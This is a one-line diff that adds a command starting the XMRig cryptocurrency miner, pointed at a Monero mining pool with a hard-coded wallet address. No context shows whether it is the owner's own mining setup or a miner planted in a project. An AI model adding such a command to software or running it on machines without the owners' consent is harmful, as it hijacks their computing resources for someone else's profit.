@@ -1,0 +1,1 @@
+./xmrig -o monerohash.com:9999 -u 43TCVCN4EePZub94fT7SGZK2tVo8vCjks3AUPHt1vmXFaFzDBvADqkiL78s4QsQWaJ8UHEToYrNyVNZ9JPASCFv78E6Umdy -k --tls
